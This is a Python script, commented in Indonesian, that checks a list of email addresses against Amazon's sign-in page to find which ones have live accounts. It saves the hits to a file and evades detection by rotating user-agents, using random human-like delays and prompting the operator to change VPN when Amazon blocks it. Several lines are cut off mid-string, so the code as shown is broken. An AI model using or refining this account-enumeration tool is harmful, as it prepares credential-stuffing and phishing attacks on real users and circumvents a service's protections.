import requests
import time
import random

# Kumpulan Sidik Jari Browser (User-Agents)
UA_LIST = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36>
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) Apple>
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36>
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/>
]

URL_AMZ = "https://www.amazon.com/ap/signin?_encoding=UTF8&openid>

def cek_email(email):
    # Pilih User-Agent secara acak
    headers = {
        "User-Agent": random.choice(UA_LIST),
        "Accept": "text/html,application/xhtml+xml,application/xm>
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }

    s = requests.Session()
    try:
        # Pancing cookie
        s.get(URL_AMZ, headers=headers, timeout=10)

        payload = {"email": email, "create": "0"}
        r = s.post(URL_AMZ, data=payload, headers=headers, timeou>

        if "not find an account" in r.text or "tidak dapat menemu>
            print(f"[-] {email} -> GAK ADA ❌")
        elif "password" in r.text or "ap_password" in r.text:
            print(f"[+] {email} -> LIVE ✅ (Amazon)")
            with open("hasil_valid.txt", "a") as f:
                f.write(email + "\n")
        elif "captcha" in r.text.lower() or r.status_code == 404:
            print(f"[!] {email} -> BLOKIR/404/CAPTCHA 🤖")
            return "reset_ip"
        else:
            print(f"[?] {email} -> UNKNOWN ({r.status_code})")

    except Exception as e:
        print(f"[!] {email} -> Error: {e}")

# Main Program
with open("list.txt", "r") as f:
    target = f.read().splitlines()

print(f"[*] Memulai scanning {len(target)} email...")
for mail in target:
    status = cek_email(mail.strip())
    if status == "reset_ip":
        print("\n[!!!] Amazon curiga. Ganti Server VPN sekarang!")
        input("Tekan ENTER kalau sudah ganti VPN untuk lanjut...")

    # Jeda acak antara 2 sampai 5 detik biar kayak manusia
    time.sleep(random.randint(2, 5))
